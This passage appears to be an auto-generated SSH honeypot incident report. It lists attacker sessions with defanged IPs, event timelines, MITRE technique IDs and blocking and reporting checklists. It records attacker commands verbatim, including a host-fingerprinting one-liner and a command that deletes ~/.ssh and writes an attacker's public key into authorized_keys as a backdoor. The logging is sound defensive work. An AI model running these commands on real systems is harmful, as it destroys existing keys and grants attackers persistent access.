- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb303cd4c597

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 12:38 |
| **Last Seen** | 2026-07-06 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:38:33` | `cowrie.session.connect` |
| `2026-07-06 12:38:33` | `cowrie.client.version` |
| `2026-07-06 12:38:33` | `cowrie.client.kex` |
| `2026-07-06 12:38:34` | `cowrie.login.success` |
| `2026-07-06 12:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f790423cc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:39 |
| **Last Seen** | 2026-07-06 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:39:10` | `cowrie.session.connect` |
| `2026-07-06 12:39:10` | `cowrie.client.version` |
| `2026-07-06 12:39:10` | `cowrie.client.kex` |
| `2026-07-06 12:39:12` | `cowrie.login.success` |
| `2026-07-06 12:39:13` | `cowrie.session.params` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.success` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:13` | `cowrie.command.input` |
| `2026-07-06 12:39:14` | `cowrie.log.closed` |
| `2026-07-06 12:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911c3c9405a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:40 |
| **Last Seen** | 2026-07-06 12:40 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:40:19` | `cowrie.session.connect` |
| `2026-07-06 12:40:22` | `cowrie.client.version` |
| `2026-07-06 12:40:22` | `cowrie.client.kex` |
| `2026-07-06 12:40:37` | `cowrie.login.success` |
| `2026-07-06 12:40:44` | `cowrie.session.params` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.success` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:44` | `cowrie.command.input` |
| `2026-07-06 12:40:48` | `cowrie.log.closed` |
| `2026-07-06 12:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c1b7eb12ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:40 |
| **Last Seen** | 2026-07-06 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:40:40` | `cowrie.session.connect` |
| `2026-07-06 12:40:40` | `cowrie.client.version` |
| `2026-07-06 12:40:40` | `cowrie.client.kex` |
| `2026-07-06 12:40:41` | `cowrie.login.success` |
| `2026-07-06 12:40:42` | `cowrie.session.params` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.success` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:42` | `cowrie.command.input` |
| `2026-07-06 12:40:43` | `cowrie.log.closed` |
| `2026-07-06 12:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c474df7ad4

| Field | Detail |
|---|---|
| **Source IP** | `20.255.61[.]0` |
| **First Seen** | 2026-07-06 12:41 |
| **Last Seen** | 2026-07-06 12:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:41:19` | `cowrie.session.connect` |
| `2026-07-06 12:41:19` | `cowrie.client.version` |
| `2026-07-06 12:41:20` | `cowrie.client.kex` |
| `2026-07-06 12:41:21` | `cowrie.login.success` |
| `2026-07-06 12:41:21` | `cowrie.session.params` |
| `2026-07-06 12:41:21` | `cowrie.command.input` |
| `2026-07-06 12:41:21` | `cowrie.command.failed` |
| `2026-07-06 12:41:22` | `cowrie.log.closed` |
| `2026-07-06 12:41:23` | `cowrie.session.params` |
| `2026-07-06 12:41:23` | `cowrie.command.input` |
| `2026-07-06 12:41:23` | `cowrie.session.file_download` |
| `2026-07-06 12:41:23` | `cowrie.log.closed` |
| `2026-07-06 12:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.255.61[.]0` to AbuseIPDB if not already reported
- [ ] Block `20.255.61[.]0` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2721d0ffc0a1

| Field | Detail |
|---|---|
| **Source IP** | `20.255.61[.]0` |
| **First Seen** | 2026-07-06 12:41 |
| **Last Seen** | 2026-07-06 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:41:23` | `cowrie.session.connect` |
| `2026-07-06 12:41:23` | `cowrie.client.version` |
| `2026-07-06 12:41:23` | `cowrie.client.kex` |
| `2026-07-06 12:41:24` | `cowrie.login.success` |
| `2026-07-06 12:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.255.61[.]0` to AbuseIPDB if not already reported
- [ ] Block `20.255.61[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1cb6f64762c

| Field | Detail |
|---|---|
| **Source IP** | `20.255.61[.]0` |
| **First Seen** | 2026-07-06 12:41 |
| **Last Seen** | 2026-07-06 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:41:25` | `cowrie.session.connect` |
| `2026-07-06 12:41:25` | `cowrie.client.version` |
| `2026-07-06 12:41:25` | `cowrie.client.kex` |
| `2026-07-06 12:41:26` | `cowrie.login.success` |
| `2026-07-06 12:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.255.61[.]0` to AbuseIPDB if not already reported
- [ ] Block `20.255.61[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb93f1687ad4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:42 |
| **Last Seen** | 2026-07-06 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:42:09` | `cowrie.session.connect` |
| `2026-07-06 12:42:09` | `cowrie.client.version` |
| `2026-07-06 12:42:09` | `cowrie.client.kex` |
| `2026-07-06 12:42:10` | `cowrie.login.success` |
| `2026-07-06 12:42:11` | `cowrie.session.params` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.success` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.command.input` |
| `2026-07-06 12:42:11` | `cowrie.log.closed` |
| `2026-07-06 12:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bc59fff85c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:42 |
| **Last Seen** | 2026-07-06 12:43 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:42:41` | `cowrie.session.connect` |
| `2026-07-06 12:42:44` | `cowrie.client.version` |
| `2026-07-06 12:42:44` | `cowrie.client.kex` |
| `2026-07-06 12:43:04` | `cowrie.login.success` |
| `2026-07-06 12:43:12` | `cowrie.session.params` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.success` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:12` | `cowrie.command.input` |
| `2026-07-06 12:43:15` | `cowrie.log.closed` |
| `2026-07-06 12:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affb2e02c650

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:43 |
| **Last Seen** | 2026-07-06 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:43:37` | `cowrie.session.connect` |
| `2026-07-06 12:43:38` | `cowrie.client.version` |
| `2026-07-06 12:43:38` | `cowrie.client.kex` |
| `2026-07-06 12:43:39` | `cowrie.login.success` |
| `2026-07-06 12:43:40` | `cowrie.session.params` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.success` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.command.input` |
| `2026-07-06 12:43:40` | `cowrie.log.closed` |
| `2026-07-06 12:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8556599b462

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 12:44 |
| **Last Seen** | 2026-07-06 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:44:50` | `cowrie.session.connect` |
| `2026-07-06 12:44:50` | `cowrie.client.version` |
| `2026-07-06 12:44:50` | `cowrie.client.kex` |
| `2026-07-06 12:44:50` | `cowrie.login.success` |
| `2026-07-06 12:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4209ea9a575

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 12:44 |
| **Last Seen** | 2026-07-06 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:44:50` | `cowrie.session.connect` |
| `2026-07-06 12:44:50` | `cowrie.client.version` |
| `2026-07-06 12:44:50` | `cowrie.client.kex` |
| `2026-07-06 12:44:50` | `cowrie.login.success` |
| `2026-07-06 12:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea7cb93745b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:45 |
| **Last Seen** | 2026-07-06 12:45 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:45:04` | `cowrie.session.connect` |
| `2026-07-06 12:45:07` | `cowrie.client.version` |
| `2026-07-06 12:45:07` | `cowrie.client.kex` |
| `2026-07-06 12:45:23` | `cowrie.login.success` |
| `2026-07-06 12:45:30` | `cowrie.session.params` |
| `2026-07-06 12:45:30` | `cowrie.command.input` |
| `2026-07-06 12:45:30` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.success` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:31` | `cowrie.command.input` |
| `2026-07-06 12:45:34` | `cowrie.log.closed` |
| `2026-07-06 12:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6b08fc7ae8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:45 |
| **Last Seen** | 2026-07-06 12:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:45:04` | `cowrie.session.connect` |
| `2026-07-06 12:45:04` | `cowrie.client.version` |
| `2026-07-06 12:45:04` | `cowrie.client.kex` |
| `2026-07-06 12:45:06` | `cowrie.login.success` |
| `2026-07-06 12:45:07` | `cowrie.session.params` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.success` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.command.input` |
| `2026-07-06 12:45:07` | `cowrie.log.closed` |
| `2026-07-06 12:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737fda20f98c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 12:45 |
| **Last Seen** | 2026-07-06 12:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:45:09` | `cowrie.session.connect` |
| `2026-07-06 12:45:10` | `cowrie.client.version` |
| `2026-07-06 12:45:10` | `cowrie.client.kex` |
| `2026-07-06 12:45:16` | `cowrie.login.success` |
| `2026-07-06 12:45:20` | `cowrie.session.params` |
| `2026-07-06 12:45:20` | `cowrie.command.input` |
| `2026-07-06 12:45:22` | `cowrie.log.closed` |
| `2026-07-06 12:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c921533ebafd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:46 |
| **Last Seen** | 2026-07-06 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:46:31` | `cowrie.session.connect` |
| `2026-07-06 12:46:31` | `cowrie.client.version` |
| `2026-07-06 12:46:31` | `cowrie.client.kex` |
| `2026-07-06 12:46:33` | `cowrie.login.success` |
| `2026-07-06 12:46:34` | `cowrie.session.params` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
| `2026-07-06 12:46:34` | `cowrie.command.input` |
